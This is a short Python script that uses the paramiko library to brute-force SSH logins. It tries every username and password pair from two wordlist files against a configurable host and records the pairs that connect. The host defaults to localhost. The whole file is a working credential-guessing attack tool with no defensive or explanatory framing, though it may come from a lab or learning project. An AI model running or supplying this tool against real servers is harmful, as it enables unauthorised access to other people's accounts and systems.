import paramiko

# set this to whatever host the ssh runs on
SSH_IP = 'localhost'

def ssh_try_connection(username, pwd, ip):
	ssh_client = paramiko.SSHClient()
	if username != ' ':
		try:
			ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
			ssh_client.connect(ip, 22, username, pwd)
			print(f'username: {username}, password: {pwd}')
			return ssh_client
		except Exception as ex:
			return None


def bruteforce(label, usernamesFile, passwordsFile):
	global SSH_IP
	successful_combos = []
	
	with open(usernamesFile, 'r') as usernames_f, open(passwordsFile, 'r', encoding='utf8') as pwds_f:
		for username in usernames_f.readlines():
			for password in pwds_f.readlines():
				username = username.rstrip()
				password = password.rstrip()
				test_con = ssh_try_connection(username, password, SSH_IP)
				if test_con:
					successful_combos.append((username, password))
					test_con.close()
					
			# return cursor for second file to the beginning of the file
			pwds_f.seek(0)

	label.setText('\n'.join([f'username: {combo[0]} password: {combo[1]}' for combo in successful_combos]))
